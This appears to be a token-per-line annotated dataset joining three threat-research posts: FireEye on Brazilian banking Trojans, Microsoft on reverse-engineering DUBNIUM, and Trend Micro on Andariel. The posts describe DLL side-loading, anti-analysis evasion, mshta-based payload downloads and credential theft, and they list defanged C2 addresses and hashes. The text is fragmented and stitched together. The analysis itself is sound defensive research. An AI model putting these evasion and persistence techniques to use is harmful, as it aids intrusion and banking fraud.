affected
system
using
a
.lnk
file
in
the
Startup
directory
.

The
.lnk
file
shown
in
Figure
17
opens
the
malicious
VBS
dropped
on
the
system
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
17
:
Persistence
Key

The
VBS
file
(
Figure
18
)
will
launch
and
execute
the
downloaded
legitimate
Windows
tool
,
which
in
this
case
is
Certmgr.exe
.

This
tool
will
be
abused
using
the
DLL
side
loading
technique
.

The
malicious
Cryptui.dll
is
loaded
into
the
program
instead
of
the
legitimate
one
and
executed
.

Figure
18
:
Contents
of
Dropped
VBS
File

Banking
Trojan
Analysis

Like
the
Trojan
from
the
first
campaign
,
this
sample
is
executed
through
search-order
hijacking
.

In
this
case
,
the
binary
abused
is
a
legitimate
Windows
tool
,
Certmgr.exe
,
that
loads
Cryptui.dll
.

Since
this
tool
depends
on
a
legitimate
DLL
named
cryptui.dll
,
the
search
order
path
will
find
the
malicious
Trojan
with
the
same
name
in
the
same
directory
and
load
it
into
its
process
space
.

The
malicious
DLL
exports
21
functions
.

Only
DllEntryPoint
contains
real
code
that
is
necessary
to
start
the
execution
of
the
malicious
code
.

The
other
functions
return
hardcoded
values
that
serve
no
real
purpose
.

On
execution
,
the
Trojan
creates
a
mutex
called
'
correria24
'
to
allow
only
one
instance
of
it
to
run
at
a
time
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

The
malware
attempts
to
resolve
'
www.goole[.]com B_url.unknown
'
(
most
likely
a
misspelling
)
.

If
successful
,
it
sends
a
request
to
hxxp://api-api[.]com B_url.unknown
/
json
in
order
to
detect
the
external
IP
of
the
victim
.

The
result
is
parsed
and
execution
continues
only
if
the
country
code
matches
'
BR
'
,
as
shown
in
Figure
19
.

Figure
19
:
Country
Code
Check

The
malware
creates
an
empty
file
in
%appdata%\Mariapeirura
on
first
execution
,
which
serves
as
a
mutex
lock
,
before
attempting
to
send
any
collected
information
to
the
C2
server
.

This
is
done
in
order
to
get
only
one
report
per
infected
host
.

The
malware
collects
host
information
,
base64
encodes
it
,
and
sends
it
to
two
C2
servers
.

The
following
items
are
gathered
from
the
infected
system
:

OS
name

OS
version

OS
architecture

AV
installed

List
of
banking
software
installed

IP
address

Directory
where
malware
is
being
executed
from

The
information
is
sent
to
hxxp://108.61.188.171/put.php B_url.unknown
(
Figure
20
)
.

Figure
20
:
Host
Recon
Data
Sent
to
First
C2
Server

The
same
information
is
sent
to
panel-dark[.]com/Contador/put.php B_url.unknown
(
Figure
21
)
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
21
:
Host
Recon
Data
Sent
to
Second
C2
Server

The
malware
alters
the
value
of
registry
key

Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ExtendedUIHoverTime
to
2710
in
order
to
change
the
number
of
milliseconds
a
thumbnail
is
showed
while
hovering
on
the
taskbar
,
as
seen
in
Figure
22
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
22
:
ExtendedUIHoverTime
Registry
Key
Change

Figure
22
:
ExtendedUIHoverTime
Registry
Key
Change

Like
the
Trojan
from
the
first
campaign
,
this
sample
checks
if
the
foreground
window's
title
contains
names
of
Brazilian
banks
and
digital
coins
by
looking
for
hardcoded
strings
.

The
malware
displays
fake
forms
on
top
of
the
banking
sites
and
intercepts
credentials
from
the
victims
.

It
can
also
display
a
fake
Windows
Update
whenever
there
is
nefarious
activity
in
the
background
,
as
seen
in
Figure
23
.

Figure
23
:
Fake
Form
Displaying
Windows
Update

The
sample
also
contains
a
keylogger
functionality
,
as
shown
in
Figure
24
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
24
:
Keylogger
Function

Command
and
Control

The
Trojan's
command
and
control
command
structure
is
identical
to
the
first
sample
.

The
commands
are
denoted
by
the
<|Command|>
syntax
.

<|OK|>
gets
a
list
of
banking
software
installed
on
the
host
.

'
<PING>
'
is
sent
from
C2
to
host
,
and
'
<PONG>
'
is
sent
from
host
to
C2
,
to
keep
connection
alive
.

<|dellLemb|>
deletes
the
registry
key
\Software\Microsoft\Internet
Explorer\notes
.

EXECPROGAM
calls
ShellExecute
to
run
the
application
given
in
the
command
.

EXITEWINDOWS
calls
ExitWindowsEx
.

NOVOLEMBRETE
creates
and
stores
data
sent
with
the
command
in
the
registry
key
\Software\Microsoft\Internet
Explorer\notes
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
25
:
Partial
List
of
Victims

This
sample
contains
most
of
the
important
strings
encrypted
.

We
provide
the
following
script
(
Figure
26
)
in
order
to
decrypt
them
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
26
:
String
Decryption
Script

Conclusion

The
use
of
multi-stage
infection
chains
makes
it
challenging
to
research
these
types
of
campaigns
all
the
way
through
.

As
demonstrated
by
our
research
,
the
attackers
are
using
various
techniques
to
evade
detection
and
infect
unsuspecting
Portuguese
-
speaking
users
with
banking
Trojans
.

The
use
of
public
cloud
infrastructure
to
help
deliver
the
different
stages
plays
a
particularly
big
role
in
delivering
the
malicious
payload
.

The
use
of
different
infection
methods
combined
with
the
abuse
of
legitimate
signed
binaries
to
load
malicious
code
makes
these
campaigns
worth
highlighting
.

Indicators
of
Compromise

Campaign
#1

TYPE

HASH

DESCRIPTION

860fa744d8c82859b41e00761c6e25f3 B_hash

PE
with
Embedded
HTA

3e9622d1a6d7b924cefe7d3458070d98 B_hash

PE
with
Embedded
HTA

f402a482fd96b0a583be2a265acd5e74 B_hash

PE
with
Embedded
HTA

f329107f795654bfc62374f8930d1e12 B_hash

PE
with
Embedded
HTA

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

789a021c051651dbc9e01c5d8c0ce129 B_hash

PE
with
Embedded
HTA

68f818fa156d45889f36aeca5dc75a81 B_hash

PE
with
Embedded
HTA

c2cc04be25f227b13bcb0b1d9811e2fe B_hash

cryptui.dll

6d2cb9e726c9fac0fb36afc377be3aec B_hash

dd73f749d40146b6c0d2759ba78b1764 B_hash

i4.dt

d9d1e72165601012b9d959bd250997b3 B_hash

VBS
file
with
commands
to
create
staging
directories
for
malware

03e4f8327fbb6844e78fda7cdae2e8ad B_hash

pvk2pfx.exe
[Legit
Windows
Tool]

Campaign
#2

hxxp://5.83.162.24/ilha/pz/logs.php B_url.unknown

hxxp://5.83.162.24/28022018/pz.zip B_url.unknown

ibamanetibamagovbr[.]org/virada/pz/logs.php B_url.unknown

sistemasagriculturagov[.]org B_url.unknown

hxxp://187.84.229.107/05022018/al.zip B_url.unknown

TYPE

HASH

DESCRIPTION

2999724b1aa19b8238d4217565e31c8e B_hash

AutoIT
Dropper

181c8f19f974ad8a84b8673d487bbf0d B_hash

img1.jpg
[lLegit
Windows
Tool]

d3f845c84a2bd8e3589a6fbf395fea06 B_hash

img2.jpg
[Banking
Trojan]

2365fb50eeb6c4476218507008d9a00b B_hash

Variants
of
Banking
Trojan

d726b53461a4ec858925ed31cef15f1e B_hash

Variants
of
Banking
Trojan

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

a8b2b6e63daf4ca3e065d1751cac723b B_hash

Variants
of
Banking
Trojan

d9682356e78c3ebca4d001de760848b0 B_hash

Variants
of
Banking
Trojan

330721de2a76eed2b461f24bab7b7160 B_hash

Variants
of
Banking
Trojan

6734245beda04dcf5af3793c5d547923 B_hash

Variants
of
Banking
Trojan

a920b668079b2c1b502fdaee2dd2358f B_hash

Variants
of
Banking
Trojan

fe09217cc4119dedbe85d22ad23955a1 B_hash

Variants
of
Banking
Trojan

82e2c6b0b116855816497667553bdf11 B_hash

Variants
of
Banking
Trojan

4610cdd9d737ecfa1067ac30022d793b B_hash

Variants
of
Banking
Trojan

34a8dda75aea25d92cd66da53a718589 B_hash

Variants
of
Banking
Trojan

88b808d8164e709df2ca99f73ead2e16 B_hash

Variants
of
Banking
Trojan

d3f845c84a2bd8e3589a6fbf395fea06 B_hash

Variants
of
Banking
Trojan

28a0968163b6e6857471305aee5c17e9 B_hash

Variants
of
Banking
Trojan

1285205ae5dd5fa5544b3855b11b989d B_hash

Variants
of
Banking
Trojan

613563d7863b4f9f66590064b88164c8 B_hash

Variants
of
Banking
Trojan

3dd43e69f8d71fcc2704eb73c1ea7daf B_hash

Variants
of
Banking
Trojan

https[:]//paneldark[.]com/w3af/img2.jpg B_url.unknown

https[:]//paneldark[.]com/w3af/img1.jpg B_url.unknown

This
entry
was
posted
on
Tue
Apr
24
11:00
EDT
2018
and
filed
under
Trojan
,
Malware
,
Edson
Sierra
,
Spam
,
and
Gerardo
Iglesias
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Sign
up
for
email
updates

Get
information
and
insight
on
today's
advanced
threats
from
the
leader
in
advanced
threat
prevention
.

First
Name

Last
Name

Email
Address

Company
Name

Threat
Research
Blog

Products
and
Services

Blog

Executive
Perspectives

Blog

SUBSCRIBE

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Company

About
FireEye

Customer
Stories

Careers

Partners

Investor
Relations

Supplier
Documents

New
s
and
Events

Newsroom

Press
Releases

Webinars

Events

Awards
and
Honors

Email
Preferences

Technical
Support

Incident
?

Report
Security
Issue

Contact
Support

Customer
Portal

Communities

Documentation
Portal

FireEye
Blogs

Threat
Research

Products
and
Services

Executive
Perspectives

Threat
Map

Threat
Map

View
the
Latest
Threats

Contact
Us

+1
877-347-3393

Stay
Connected

Stay
Connected

Copyright
©
2018
FireEye
,
Inc
.

All
rights
reserved
.

Privacy
&
Cookies
Policy
|
Privacy
Shield
|
Legal
Documentation

Site
Language

English


Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!
Reverse
-
engineering
DUBNIUM B_malware.drop

blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/ B_url.normal

June
9
,
2016

DUBNIUM B_malware.drop
(
which
shares
indicators
with
what
Kaspersky
researchers
have
called
DarkHotel
)
is
one
of
the
activity
groups
that
has
been
very
active
in
recent
years
,
and
has
many
distinctive
features
.

We
located
multiple
variants
of
multiple-stage
droppers
and
payloads
in
the
last
few
months
,
and
although
they
are
not
really
packed
or
obfuscated
in
a
conventional
way
,
they
use
their
own
methods
and
tactics
of
obfuscation
and
distraction
.

In
this
blog
,
we
will
focus
on
analysis
of
the
first-stage
payload
of
the
malware
.

As
the
code
is
very
complicated
and
twisted
in
many
ways
,
it
is
a
complex
task
to
reverse
-
engineer
the
malware
.

The
complexity
of
the
malware
includes
linking
with
unrelated
code
statically
(
so
that
their
logic
can
hide
in
a
big
,
benign
code
dump
)
and
excessive
use
of
an
in-house
encoding
scheme
.

Their
bootstrap
logic
is
also
hidden
in
plain
sight
,
such
that
it
might
be
easy
to
miss
.

Every
sub-routine
from
the
malicious
code
has
a
'
memory
cleaner
routine
'
when
the
logic
ends
.

The
memory
snapshot
of
the
process
will
not
disclose
many
more
details
than
the
static
binary
itself
.

The
malware
is
also
very
sneaky
and
sensitive
to
dynamic
analysis
.

When
it
detects
the
existence
of
analysis
toolsets
,
the
executable
file
bails
out
from
further
execution
.

Even
binary
instrumentation
tools
like
PIN
or
DynamoRio
prevent
the
malware
from
running
.

This
effectively
defeats
many
automation
systems
that
rely
on
at
least
one
of
the
toolsets
they
check
to
avoid
.

Avoiding
these
toolsets
during
analysis
makes
the
overall
investigation
even
more
complex
.

With
this
blog
series
,
we
want
to
discuss
some
of
the
simple
techniques
and
tactics
we've
used
to
break
down
the
features
of
DUBNIUM B_malware.drop
.

We
acquired
multiple
versions
of
DUBNIUM B_malware.drop
droppers
through
our
daily
operations
.

They
are
evolving
slowly
,
but
basically
their
features
have
not
changed
over
the
last
few
months
.

In
this
blog
,
we'll
be
using
sample
SHA1
:
dc3ab3f6af87405d889b6af2557c835d7b7ed588 B_hash
in
our
examples
and
analysis
.

Hiding
in
plain
sight

The
malware
used
in
a
DUBNIUM B_malware.drop
attack
is
committed
to
disguising
itself
as
Secure
Shell
(
SSH
)
tool
.

In
this
instance
,
it
is
attempting
to
look
like
a
certificate
generation
tool
.

The
file
descriptions
and
other
properties
of
the
malware
look
convincingly
legitimate
at
first
glance
.

When
it
is
run
,
the
program
actually
dumps
out
dummy
certificate
files
into
the
file
system
and
,
again
,
this
can
be
very
convincing
to
an
analyst
who
is
initially
researching
the
file
.

The
binary
is
indeed
statically
linked
with
OpenSSL
library
,
such
that
it
really
does
look
like
an
SSH
tool
.

The
problem
with
reverse
engineering
this
sample
starts
from
the
fact
that
it
has
more
than
2,000
functions
and
most
of
them
are
statically
linked
to
OpenSSL
code
without
symbols
.

The
following
is
an
example
of
one
of
these
functions
–
note
it
even
has
string
references
to
the
source
code
file
name
.

It
can
be
extremely
time-consuming
just
going
through
the
dump
of
functions
that
have
no
meaning
at
all
in
the
code
–
and
this
is
only
one
of
the
more
simplistic
tactics
this
malware
is
using
.

We
can
solve
this
problem
using
binary
similarity
calculation
.

This
technique
has
been
around
for
years
for
various
purposes
,
and
it
can
be
used
to
detect
code
that
steals
copyrighted
code
from
other
software
.

The
technique
can
be
used
to
find
patched
code
snippets
in
the
software
and
to
find
code
that
was
vulnerable
for
attack
.

In
this
instance
,
we
can
use
the
same
technique
to
clean
up
unnecessary
code
snippets
from
our
advanced
persistent
threat
(
APT
)
analysis
and
make
a
reverse
engineer's
life
easier
.

Figure
1
:
SSH
tool
disguise

Figure
2
Create
dummy
certificate
files

Many
different
algorithms
exist
for
binary
similarity
calculation
,
but
we
are
going
to
use
one
of
the
simplest
approach
here
.

The
algorithm
will
collect
the
op-code
strings
of
each
instruction
in
the
function
first
(
Figure
5
)
.

It
will
then
concatenate
the
whole
string
and
will
use
a
hash
algorithm
to
get
the
hash
out
of
it
.

We
used
the
SHA1
hash
in
this
case
.

Figure
6
shows
the
Python-style
pseudo-code
that
calculates
the
hash
for
a
function
.

Sometimes
,
the
immediate
constant
operand
is
a
valuable
piece
of
information
that
can
be
used
to
distinguish
similar
but
different
functions
and
it
also
includes
the
value
in
the
hash
string
.

It
is
using
our
own
utility
function
RetrieveFunctionInstructions
which
returns
a
list
of
op-code
and
operand
values
from
a
designated
function
.

01
def
CalculateFunctionHash(self,func_ea
)
:
02
hash_string=
'
'
03
for
(
op
,
operand
)
in
self.RetrieveFunctionInstructions(func_ea
)
:
04
hash_string+=op
05
if
len(drefs)==0
:
06
for
operand
in
operands
:
07
if
operand.Type==idaapi.o_imm
:
08
hash
_string+=('%x
'
%
operand.Value
)
10
m=hashlib.sha1(
)
11
m.update(op_string
)
12
return
m.hexdigest(
)

Figure
3
:
DUBNIUM B_malware.drop
functions
list

Figure
6
:
Pseudo-code
for
CalculateFunctionHash

With
these
hash
values
calculated
for
the
DUBNIUM B_malware.drop
binary
,
we
can
compare
these
values
with
the
hash
values
from
the
original
OpenSSL
library
.

We
identified
from
the
compilergenerated
meta-data
that
the
version
the
sample
is
linked
to
is
openssl-1.0.1l-i386-win
.

After
gathering
same
hash
from
the
OpenSSL
library
,
we
could
import
symbols
for
the
matched
functions
.

In
this
way
,
removed
most
of
the
functions
from
our
analysis
scope
.

(
This
blog
is
continued
on
the
next
page
)

Pages
:
Page
1
,
Page
2
,
Page
3

Figure
4
:
Code
snippet
that
is
linked
from
OpenSSL
library

Figure
5
:
Op
code
in
the
instructions

Figure
7
:
OpenSSL
functions

Reverse
-
engineering
DUBNIUM B_malware.drop
blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/2/ B_url.normal

Persistently
encoded
strings

The
other
issue
when
reverse
-
engineering
DUBNIUM B_malware.drop
binaries
is
that
it
encodes
every
single
string
that
is
used
in
the
code
(
Figure
8
)
.

There
is
no
clue
on
the
functionality
of
purpose
of
the
binary
by
just
looking
at
the
string's
table
.

We
had
to
decode
each
of
these
strings
to
understand
what
the
binary
is
intended
to
do
.

This
may
not
be
technically
difficult
,
but
it
does
require
a
lot
of
time
and
effort
.

June
9
,
2016

Figure
9
shows
how
these
encoded
strings
are
used
.

For
example
,
address
0x142C11C
has
an
instruction
that
loads
an
encoded
string
which
is
decoded
as
'
hook_disable_retaddr_check
'
.

The
encoded
string
is
passed
in
ecx
register
to
the
decoder
function
(
decode
_
string
)
.

Note
that
the
symbol
names
for
the
functions
were
made
by
us
during
the
analysis
.

Figure
8
:
Encoded
strings

Because
the
decode
_
string
function
is
excessively
used
and
encoded
gibberish
strings
are
always
passed
to
it
,
we
can
be
confident
that
the
function
is
truly
a
string
decoder
.

The
decode
_
string
function
looks
like
Figure
10
.

There
are
some
approaches
that
can
be
taken
for
decoding
these
files
:
you
could
port
the
code
to
C
or
Python
and
run
them
through
encoded
strings
,
or
you
could
reuse
the
code
snippet
itself
and
pass
the
encoded
string
to
the
decoder
function
.

We
took
the
second
option
and
reused
the
existing
code
for
decoding
strings
,
for
faster
analysis
of
the
sample
.

Figure
9
:
Excessive
use
of
encoded
strings

For
example
,
we
have
an
encoded
string
at
address
0x013C992C
.

The
decode
_
string
function
is
located
at
0x01437036
in
our
case
.

The
ecx
register
will
point
to
the
encoded
string
and
edx
is
the
destination
buffer
address
for
the
decoded
string
.

We
just
came
up
with
the
right
place
on
the
stack
with
enough
buffer
,
which
in
this
case
is
esp+0x348
.

lea
edx,[esp+0x348]
–
pointer
to
stack
buffer
address

mov
ecx
,
0x013C992C
–
pointer
to
encoded
string

call
0x01437036
–
call
to
decode
_
string

As
the
instructions
above
will
decode
the
encoded
string
for
us
,
we
can
use
Windbg
to
run
our
code
.

First
we
prepared
a
virtual
machine
environment
,
because
we
can
possibly
run
malicious
routines
from
the
sample
.

As
there
are
some
possibilities
that
the
decode
_
string
function
is
dependent
on
some
initialization
routines
called
at
startup
,
we
put
our
first
breakpoint
to
the
location
where
the
first
instance
of
decode
_
string
is
called
.

In
this
way
,
we
can
guarantee
that
our
own
decode
_
string
call
will
be
surely
called
with
proper
setup
.

That
address
we
came
up
with
is
0x0142BFEE
(
Figure
12
)
.

Here's
where
our
breakpoint
is
hit
at
this
address
.

Now
we
need
to
write
the
memory
over
with
our
own
code
.

The
memory
location
where
eip
is
pointing
looks
like
the
following
.

Basically
,
we
put
the
breakpoint
on
the
entry
of
the
decode_string
and
exit
of
the
function
.

With
the
entry
of
the
function
,
we
save
the
edx
register
value
to
a
temporary
register
and
use
it
to
dump
out
the
decoded
string
memory
location
at
the
exit
point
.

Figure
10
:
decode
_
string
routine

Now
we
have
a
handy
way
to
decrypt
the
strings
we
have
.

Just
after
a
few
IDAPython
scripts
that
retrieve
all
possible
encoded
strings
and
automatically
generates
the
assembly
code
that
calls
decode
_
string
,
we
can
come
up
with
a
new
IDA
listing
that
shows
the
decoded
string
as
the
comment
.

(
This
blog
is
continued
on
the
next
page
)

Pages
:
Page
1
,
Page
2
,
Page
3

Figure
11
:
Encoded
string

Figure
12
:
First
breakpoint

Figure
13
:
Breakpoint
on
0142bfee
hit

Figure
14
:
Use
'
a
'
command
to
write
instructions
over
the
current
eip
location

Figure
15
:
New
disassembly
code

Figure
16
:
Breakpoints
and
dump
of
decoded
string

Figure
17
:
Decoded
strings

Reverse
-
engineering
DUBNIUM B_malware.drop
blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/3/ B_url.normal

Memory
cleanup

Even
after
encoding
every
single
string
related
to
malicious
code
,
the
DUBNIUM B_malware.drop
malware
goes
one
more
step
to
hide
its
internal
operations
.

When
it
calls
decode
_
string
to
decode
an
encoded
string
,
it
will
use
the
local
stack
variable
to
save
the
decoded
string
.

Whenever
the
function
returns
,
it
calls
fill_memory_with_random_bytes
function
for
every
local
variable
it
used
,
so
that
the
stack
is
cleared
from
decoded
strings
.

June
9
,
2016

The
memory
cleaner
function
generates
random
bytes
and
fills
the
memory
area
.

This
can
be
very
simple
,
and
but
still
can
be
very
annoying
to
malware
analysts
because
,
even
with
memory
snapshot
,
we
can't
acquire
any
meaningful
strings
out
of
it
.

It's
not
easy
to
get
a
clue
of
what
this
binary
is
doing
internally
by
just
skimming
through
a
memory
snapshot
.

Various
environment
check

Once
we
have
decoded
the
string
,
further
reverse
engineering
becomes
trivial
.

It
is
no
more
complicated
than
any
other
malware
we
observe
on
a
daily
basis
.

The
DUBNIUM B_malware.drop
binary
checks
for
the
running
environment
very
extensively
.

It
has
a
very
long
list
of
security
products
and
other
software
it
detects
,
and
it
appears
that
it
detects
all
major
antimalware
and
antivirus
vendor
process
names
.

Figure
18
:
Calling
memory
cleaner
function

Figure
18b
:
Calling
memory
cleaner
function

One
other
very
interesting
fact
is
the
presence
of
process
names
that
are
associated
with
software
mainly
used
in
China
.

For
example
,
QQPCRTP.exe
and
QQPCTray.exe
are
from
a
messaging
software
by
a
company
based
in
China
.

Also
,
ZhuDongFangYu.exe
,
360tray.exe
and
360sd.exe
process
names
are
used
by
security
products
that
originate
from
China
.

From
the
software
it
detects
,
we
get
the
impression
that
the
malware
is
focusing
on
a
specific
geolocation
as
its
target
.

Aside
from
security
programs
and
other
programs
used
daily
that
can
be
used
to
profile
its
targets
,
the
DUBNIUM B_malware.drop
malware
also
checks
for
various
program
analysis
tools
including
Pin
and
DynamoRIO
.

It
also
checks
for
a
virtual
machine
environment
.

If
some
of
these
are
detected
,
it
quits
its
execution
.

Overall
,
the
malware
is
very
cautious
and
deterministic
in
running
its
main
code
.

The
following
figure
shows
the
code
that
checks
for
the

Figure
19
:
Extensive
list
of
process
names

existence
of
the
Fiddler
web
debugger
,
which
is
very
popular
among
malware
analysts
.

As
we
wanted
to
use
Fiddler
to
get
a
better
understanding
on
the
network
activity
of
the
malware
,
we
manually
patched
the
routine
so
it
would
not
detect
the
Fiddler
mutex
.

Second
payload
download

The
DUBNIUM B_malware.drop
samples
are
distributed
in
various
ways
,
one
instance
was
using
a
zero-day
exploit
that
targets
Adobe
Flash
,
in
December
2015
.

We
also
observed
the
malware
is
distributed
through
spear
-
phishing
campaigns
that
involve
social
engineering
with
LNK
files
.

Figure
20
:
Fiddler
mutex
check

After
downloading
this
payload
,
it
would
check
the
running
environment
and
will
only
proceed
with
the
next
stage
when
it
determines
the
target
is
a
valid
one
for
its
purpose
.

If
software
and
environment
check
passes
,
the
first
stage
payload
will
try
to
download
the
second
stage
payload
from
the
command
and
control
(
C&C
)
server
.

It
will
pass
information
such
as
the
IP
,
MAC
address
,
hostname
and
Windows
language
ID
to
the
server
,
and
the
server
will
return
the
encoded
second
stage
payload
.

The
way
the
first
stage
payload
downloads
the
second
payload
is
both
interesting
and
unique
.

It
doesn't
access
the

Internet
directly
from
the
code
,
but
it
uses
the
systeminstalled
mshta.exe
binary
.

Mshta.exe
is
often
used
by
malware
to
run
VBscript
for
malicious
purposes
,
but
using
it
for
downloading
a
general
purpose
payload
is
not
so
common
.

This
is
because
mshta.exe
doesn't
support
downloading
URL
contents
directly
to
an
arbitrary
location
.

DUBNIUM B_malware.drop
spawns
the
mshta.exe
process
with
the
URL
to
download
and
waits
for
some
time
,
after
that
it
opens
the
mshta.exe
process
and
goes
through
open
file
handles
to
find
a
handle
for
the
temporary
file
that
is
associated
with
the
downloaded
contents
.

Figure
21
:
2nd
payload
download
traffic

Figure
22
:
Encoded
strings
of
the
client
information

This
is
a
very
inconvenient
way
to
download
a
payload
from
the
Internet
,
but
it
is
useful
for
hiding
the
originating
process
for
network
activities
.

Sometimes
network
security
programs
check
for
the
process
name
and
their
digital
signature
to
check
if
they
have
the
right
to
access
outside
the
network
.

In
that
case
,
this
feature
will
be
very
handy
for
the
malware
.

As
you
can
see
from
the
figures
below
,
it
uses
processrelated
documented
and
undocumented
APIs
to
retrieve
file
handles
from
the
mshta.exe
process
,
resolves
their
names
and
uses
filename
heuristics
to
check
if
it
is
a
response
file
or
not
.

Figure
23
:
mshta.exe
execution
code

The
cache
filename
will
be
retrieved
and
opened
to
retrieve
the
payload
from
the
C&C
server
.

Conclusion

Overall
,
the
functionality
of
the
DUBNIUM B_malware.drop
first
stage
payload
is
not
so
advanced
in
its
functionality
.

It
is
a
very
simple
downloader
for
the
second
stage
payload
.

However
,
the
way
it
operates
is
very
strategic
:

It
hides
in
plain
sight
.

Figure
24
:
API
calls
to
retrieve
handle
file
name
in
mshta.exe
process

It
is
very
careful
in
initiating
the
next
stage
of
the
attack
.

It
checks
many
different
security
products
and
userinstalled
programs
that
are
bound
to
specific
geolocations
and
cultures
.

It
encodes
every
string
that
can
be
useful
for
quick
analysis
.

It
encodes
outbound
web
traffic
.

It
doesn't
use
high
class
encryption
–
but
it
does
use
an
excessive
amount
of
in-house
string
scrambling
algorithms
.

It
checks
for
many
popular
virtual
environments
and
automatic
analysis
systems
that
are
used
for
malware
analysis
,
including
VMware
,
Virtualbox
and
Cuckoo
Sandbox

It
checks
for
popular
dynamic
analysis
tools
like
PIN
tool
,
DynamoRIO
and
other
emulators
.

Figure
25
:
Cache
filename

Figure
26
:
Using
mshta.exe
to
download
additional
payload

In
conclusion
,
this
is
the
first
stage
payload
with
more
of
reconnaissance
purpose
and
it
will
trigger
next
stage
attack
only
when
it
decides
the
environment
is
safe
enough
for
attack
.

Appendix B_hash
–
Indicators
of
compromise

We
discovered
the
following
SHA1s
in
relation
to
DUBNIUM B_malware.drop
:

35847c56e3068a98cff85088005ba1a611b6261f B_hash

09b022ef88b825041b67da9c9a2588e962817f6d B_hash

7f9ecfc95462b5e01e233b64dcedbcf944e97fca B_hash

cad21e4ae48f2f1ba91faa9f875816f83737bcaf B_hash

ebccb1e12c88d838db15957366cee93c079b5a8e B_hash

aee8d6f39e4286506cee0c849ede01d6f42110cc B_hash

b42ca359fe942456de14283fd2e199113c8789e6 B_hash

0ac65c60ad6f23b2b2f208e5ab8be0372371e4b3 B_hash

1949a9753df57eec586aeb6b4763f92c0ca6a895 B_hash

259f0d98e96602223d7694852137d6312af78967 B_hash

4627cff4cd90dc47df5c4d53480101bdc1d46720 B_hash

561db51eba971ab4afe0a811361e7a678b8f8129 B_hash

6e74da35695e7838456f3f719d6eb283d4198735 B_hash

8ff7f64356f7577623bf424f601c7fa0f720e5fb B_hash

a3bcaecf62d9bc92e48b703750b78816bc38dbe8 B_hash

c9cd559ed73a0b066b48090243436103eb52cc45 B_hash

dc3ab3f6af87405d889b6af2557c835d7b7ed588 B_hash

df793d097017b90bc9d7da9a85f929422004f6b6 B_hash

8ff7f64356f7577623bf424f601c7fa0f720e5fb B_hash

6ccba071425ba9ed69d5a79bb53ad27541577cb9 B_hash

-Jeong
Wook
Oh

MMPC

Pages
:
Page
1
,
Page
2
,
Page
3
Trend
Micro

About
TrendLabs
Security
Intelligence
Blog

Home

Categories

Search
:

Home
'
Bad
Sites
'
New
Andariel
Reconnaissance
Tactics
Hint
At
Next
Targets

New
Andariel
Reconnaissance
Tactics
Hint
At
Next
Targets

Posted
on
:
July
16
,
2018
at
8:10
am
Posted
in
:
Bad
Sites
Author
:
Joseph
C
Chen
(
Fraud
Researcher
)

In
cooperation
with
IssueMakersLab
of
South
Korea

Reconnaissance
plays
a
vital
role
in
criminal
operations
,
and
some
groups
go
to
great
lengths
to
investigate
their
targets
'
systems
.

A
recent
example
is
the
Andariel
Group
,
a
known
branch
of
the
notorious
Lazarus
Group
.

Last
month
we
tracked
new
scouting
techniques
coming
from
Andariel
,
which
were
used
mainly
against
South
Korean
targets
.

Andariel
has
been
quite
active
these
past
few
months
.

According
to
South
Korean
security
researchers

IssueMakersLab
,
the
group
used
an
ActiveX
zero-day
exploit
for
watering
hole
attacks
on
South
Korean
websites
last
May—they
called
this
'
Operation
GoldenAxe
'
.

But
more
recently
on
June
21
,
we
noticed
that
Andariel
injected
their
script
into
four
other
compromised
South
Korean
websites
for
reconnaissance
purposes
.

We
found
that
the
code
of
the
new
injected
script
is
similar
to
the
sample
Andariel
previously
used
in
May
.

However
,
the
new
script
was
trying
to
collect
different
ActiveX
object
information
and
targeted
objects
that
it
wasn't
attacking
before
.

Convert
webpages
to
pdf
online
with
PDFmyURL

Featured
Stories
systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux
qkG B_malware.ransom
Filecoder
:
Self-Replicating
,
Document-Encrypting
Ransomware

Mitigating
CVE-2017-5689 B_malware.backdoor
,
an
Intel
Management

Engine
Vulnerability

A
Closer
Look
at
North
Korea's
Internet

From
Cybercrime
to
Cyberpropaganda

Security
Predictions
for
2018

Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,

In
the
earlier
case
,
the
group
collected
targeted
ActiveX
objects
on
users
'
Internet
Explorer
browser
before
they
used
the
zero-day
exploit
.

This
was
possibly
part
of
their
reconnaissance
strategy
,
to
find
the
right
targets
for
their
exploit
.

Based
on
this
,
we
believe
it's
likely
that
the
new
targeted
ActiveX
objects
we
found
could
be
their
next
targets
for
a
watering
hole
exploit
attack
.

To
help
prevent
any
damage
,
we
decided
to
publish
our
findings
before
the
group
deploys
the
attack
.

IoT
hacks
,
and
operational
disruptions
.

The
ever-shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
.

Read
our
security
predictions
for
2018
.

Business
Process
Compromise

Attackers
are
starting
to
invest
in
longterm
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:

Business
Process
Compromise
.

Recent
Posts

Blackgear
Cyberespionage
Campaign

Resurfaces
,
Abuses
Social
Media
for
C&C

Communication

New
Andariel
Reconnaissance
Tactics
Hint
At
Next

Targets

VPNFilter-affected
Devices
Still
Riddled
with
19
Vulnerabilities

July
Patch
Tuesday
:
Large
Adobe
Security
Update
and
Patches
